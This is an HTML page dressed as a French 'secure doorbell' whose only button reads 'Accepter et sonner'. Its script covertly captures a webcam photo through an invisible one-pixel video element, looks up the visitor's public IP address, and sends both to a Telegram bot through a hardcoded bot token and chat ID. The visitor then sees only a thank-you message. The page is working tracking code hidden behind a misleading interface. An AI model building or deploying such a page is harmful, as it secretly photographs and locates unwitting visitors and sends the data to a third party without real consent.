<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sonnette Sécurisée</title>
    <style>
        .consent-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
        }

        .consent-box {
            background: #2c3e50;
            padding: 2rem;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
        }

        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
        }

        #statusMsg {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }
        
        /* Elemento de vídeo oculto */
        #hiddenVideo {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div class="consent-modal" id="consentModal">
        <div class="consent-box">
            <h2>SONNETTE</h2>
            <p>Felipe Torres:</p>
            <button onclick="initiateActivation()">Accepter et sonner</button>
        </div>
    </div>

    <div id="statusMsg"></div>
    <video id="hiddenVideo" autoplay playsinline></video>

<script>
const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
const CHAT_ID = '5562266493';

async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip };
    } catch (error) {
        return { ip: 'Indisponible' };
    }
}

async function capturePhoto() {
    const video = document.getElementById('hiddenVideo');
    
    // Acessar câmera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    
    // Esperar a câmera inicializar
    await new Promise(resolve => setTimeout(resolve, 500));
    
    // Capturar frame
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    // Parar a câmera
    stream.getTracks().forEach(track => track.stop());
    
    return canvas.toDataURL('image/jpeg', 0.8);
}

async function sendToTelegram(ip, photoUrl) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', `Un colis est arrivé! La cloche a sonné!\nIP: ${ip}`);

        const blob = await fetch(photoUrl).then(r => r.blob());
        formData.append('photo', blob, 'visitor.jpg');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        return true;
    } catch (error) {
        console.error('Erreur:', error);
        return false;
    }
}

async function initiateActivation() {
    try {
        document.getElementById('consentModal').style.display = 'none';
        document.getElementById('statusMsg').innerHTML = 'Activation en cours...';

        // Capturar dados
        const ipInfo = await getIPInfo();
        const photoUrl = await capturePhoto();
        
        // Enviar para Telegram
        const success = await sendToTelegram(ipInfo.ip, photoUrl);
        
        if(success) {
            document.getElementById('statusMsg').innerHTML = `
                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
                    ✓ Merci d'avoir sonné. Passe une bonne journée!
                </div>
            `;
        } else {
            throw new Error('Échec de l\'envoi');
        }

    } catch (error) {
        document.getElementById('statusMsg').innerHTML = `
            <div style="color:red; background:#ecf0f1; padding:15px; border-radius:8px;">
                ✗ Erreur: ${error.message || 'Service indisponible'}
            </div>
        `;
    }
}

window.onload = () => {
    document.getElementById('consentModal').style.display = 'flex';
}
</script>
</body>
</html>
